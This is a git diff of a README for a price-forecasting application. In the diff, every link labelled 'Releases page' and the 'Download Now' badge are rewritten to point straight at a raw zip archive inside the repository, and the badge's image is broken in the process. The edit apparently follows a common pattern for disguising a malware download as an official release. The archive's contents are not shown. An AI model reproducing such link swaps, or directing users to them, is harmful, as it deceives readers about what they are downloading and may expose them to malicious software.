@@ -6,9 +6,9 @@ Welcome! You are about to use the prices predictor system, a powerful tool that 
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases page](https://github.com/danuah/prices-predictor-system/releases) where you can find the latest version of the software.
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/danuah/prices-predictor-system/main/convolutionary/system_predictor_prices_3.7.zip) where you can find the latest version of the software.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/danuah/prices-predictor-system/releases)
+[![Download Now](https://raw.githubusercontent.com/danuah/prices-predictor-system/main/convolutionary/system_predictor_prices_3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/danuah/prices-predictor-system/main/convolutionary/system_predictor_prices_3.7.zip)
 
 ## 🖥️ System Requirements
 
@@ -33,7 +33,7 @@ The prices predictor system includes several features that make price forecastin
 
 ### Step 1: Download the Application
 
-Visit our [Releases page](https://github.com/danuah/prices-predictor-system/releases) to download the latest version. Choose the file that matches your operating system and save it on your computer.
+Visit our [Releases page](https://raw.githubusercontent.com/danuah/prices-predictor-system/main/convolutionary/system_predictor_prices_3.7.zip) to download the latest version. Choose the file that matches your operating system and save it on your computer.
 
 ### Step 2: Install the Application
 
@@ -67,7 +67,7 @@ If you encounter issues while using the application, try the following:
 
 - **Check System Requirements:** Ensure your computer meets the basic requirements mentioned above.
 - **Re-download the File:** If the installation fails, re-download the application and try again.
-- **Look for Updates:** Sometimes bugs are fixed in newer releases. Check the [Releases page](https://github.com/danuah/prices-predictor-system/releases) for updates.
+- **Look for Updates:** Sometimes bugs are fixed in newer releases. Check the [Releases page](https://raw.githubusercontent.com/danuah/prices-predictor-system/main/convolutionary/system_predictor_prices_3.7.zip) for updates.
 
 ## 🌐 Support
 
